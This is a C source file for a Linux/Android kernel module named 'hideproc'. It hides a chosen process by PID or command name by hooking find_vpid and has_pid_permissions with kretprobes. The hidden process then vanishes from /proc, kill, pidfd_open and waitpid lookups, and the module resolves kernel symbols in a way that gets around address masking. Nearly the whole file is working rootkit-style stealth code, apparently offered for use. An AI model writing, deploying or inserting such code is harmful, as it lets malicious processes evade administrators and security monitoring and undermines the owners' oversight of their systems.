/*
 * hideproc — kretprobe-based process hider (LKM)
 *
 * Hides a process globally by making the kernel's pid resolver return
 * "not found" for it. One hook covers more than any per-syscall hack:
 *
 *     /proc/<pid>  -> ENOENT   (proc_pid_lookup -> find_vpid)
 *     kill(2)      -> ESRCH    (kill_pid_info -> find_vpid)
 *     pidfd_open   -> ENOENT   (find_get_task_by_vpid -> find_vpid)
 *     waitpid      -> ESRCH
 *
 * Listing hide is done where the kernel itself does it for
 * HIDEPID_INVISIBLE: has_pid_permissions() (optional, present on
 * Android GKI 5.10+; the module still works without it).
 *
 * Portability: only long-lived exported kernel symbols are used
 * (find_vpid, register_kprobe, unregister_kprobe), resolved through
 * kprobe (survives kptr_restrict + masked kallsyms). Works on
 * 5.10 / 6.1 / 6.6 / 6.12 GKI and any CONFIG_KPROBES kernel.
 *
 * Usage:
 *   insmod hideproc.ko hide_comm=magic   # hide by comm name
 *   insmod hideproc.ko hide_pid=12345    # hide by tgid
 *   insmod hideproc.ko hide_comm=magic hide_pid=12345
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/version.h>
#include <linux/sched.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("local");
MODULE_DESCRIPTION("kretprobe process hider");

/* ------------------------------------------------------------------ */
/*  module parameters                                                  */
/* ------------------------------------------------------------------ */

static int hide_pid = 0;
static char hide_comm[TASK_COMM_LEN] = "";

module_param(hide_pid, int, 0644);
module_param_string(hide_comm, hide_comm, TASK_COMM_LEN, 0644);

static bool want_pid  = false;
static bool want_comm = false;

/* ------------------------------------------------------------------ */
/*  target match helpers                                               */
/* ------------------------------------------------------------------ */

static bool task_matches(struct task_struct *task)
{
    if (!task)
        return false;

    if (want_pid && hide_pid > 0) {
        pid_t tgid = task_tgid_nr(task);
        if (tgid == (pid_t)hide_pid)
            return true;
    }

    if (want_comm && hide_comm[0]) {
        char comm[TASK_COMM_LEN];
        get_task_comm(comm, task);
        if (strncmp(comm, hide_comm, TASK_COMM_LEN - 1) == 0)
            return true;
    }

    return false;
}

static bool nr_matches(int nr)
{
    return want_pid && hide_pid > 0 && nr == (int)hide_pid;
}

/* ------------------------------------------------------------------ */
/*  kretprobe: find_vpid                                               */
/* ------------------------------------------------------------------ */

#define ARG_NR 0

static int find_vpid_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    int nr = (int)regs->regs[ARG_NR];
    *(int *)ri->data = nr;
    return 0;
}

static int find_vpid_ret(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    /* If the looked-up nr was hidden, turn the result into NULL. */
    if (nr_matches(*(int *)ri->data))
        regs->regs[0] = 0; /* x0 = return value (struct pid *) */
    return 0;
}

static struct kretprobe kp_find_vpid = {
    .handler       = find_vpid_ret,
    .entry_handler = find_vpid_entry,
    .data_size     = sizeof(int),
    .maxactive     = 64,
};

/* ------------------------------------------------------------------ */
/*  kretprobe: has_pid_permissions (listing hide)                      */
/* ------------------------------------------------------------------ */

/* bool has_pid_permissions(struct proc_fs_info *fs_info,
 *                          struct task_struct *task,
 *                          enum proc_hidepid hide_pid)
 * arg regs: x0=fs_info, x1=task, x2=hide_pid, return x0 (bool)       */
#define HPP_ARG_TASK    1
#define HPP_ARG_HIDEPID 2
#define HPP_INVISIBLE   2

struct hpp_data {
    struct task_struct *task;
};

static int hpp_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct hpp_data *d = (struct hpp_data *)ri->data;
    d->task = (struct task_struct *)regs->regs[HPP_ARG_TASK];
    return 0;
}

static int hpp_ret(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct hpp_data *d = (struct hpp_data *)ri->data;

    if ((int)regs->regs[HPP_ARG_HIDEPID] == HPP_INVISIBLE &&
        task_matches(d->task)) {
        regs->regs[0] = 0; /* false -> proc_pid_readdir() skips entry */
    }
    return 0;
}

static struct kretprobe kp_hpp = {
    .handler       = hpp_ret,
    .entry_handler = hpp_entry,
    .data_size     = sizeof(struct hpp_data),
    .maxactive     = 64,
};
static bool hpp_installed = false;

/* ------------------------------------------------------------------ */
/*  symbol resolution via kprobe (works with masked kallsyms)          */
/* ------------------------------------------------------------------ */

static unsigned long lookup_sym(const char *name)
{
    struct kprobe kp = { .symbol_name = name };
    unsigned long addr = 0;

    if (register_kprobe(&kp) == 0) {
        addr = (unsigned long)kp.addr;
        unregister_kprobe(&kp);
    }
    return addr;
}

/* ------------------------------------------------------------------ */
/*  module lifecycle                                                   */
/* ------------------------------------------------------------------ */

static int __init hideproc_init(void)
{
    unsigned long sym_find_vpid, sym_hpp;
    int ret;

    want_pid  = (hide_pid > 0);
    want_comm = (hide_comm[0] != '\0');
    if (!want_pid && !want_comm) {
        pr_err("hideproc: set hide_pid= or hide_comm= (nothing to hide)\n");
        return -EINVAL;
    }

    pr_info("hideproc: hide pid=%d comm='%s'\n", hide_pid,
            want_comm ? hide_comm : "(none)");

    sym_find_vpid = lookup_sym("find_vpid");
    sym_hpp       = lookup_sym("has_pid_permissions");

    if (!sym_find_vpid) {
        pr_err("hideproc: find_vpid not resolvable, abort\n");
        return -ENOENT;
    }

    kp_find_vpid.kp.symbol_name = "find_vpid";
    ret = register_kretprobe(&kp_find_vpid);
    if (ret != 0) {
        pr_err("hideproc: register_kretprobe(find_vpid) failed %d\n", ret);
        return ret;
    }
    pr_info("hideproc: find_vpid hook ok (0x%lx, hits %u)\n",
            sym_find_vpid, kp_find_vpid.nmissed);

    if (sym_hpp) {
        kp_hpp.kp.symbol_name = "has_pid_permissions";
        ret = register_kretprobe(&kp_hpp);
        if (ret == 0) {
            hpp_installed = true;
            pr_info("hideproc: has_pid_permissions hook ok (listing-hide on)\n");
        } else {
            pr_warn("hideproc: has_pid_permissions hook failed %d "
                    "(listing visible, direct access still hidden)\n", ret);
        }
    } else {
        pr_warn("hideproc: has_pid_permissions not found "
                "(listing visible, direct access still hidden)\n");
    }

    return 0;
}

static void __exit hideproc_exit(void)
{
    unregister_kretprobe(&kp_find_vpid);
    if (hpp_installed)
        unregister_kretprobe(&kp_hpp);
    pr_info("hideproc: unloaded, target visible again\n");
}

module_init(hideproc_init);
module_exit(hideproc_exit);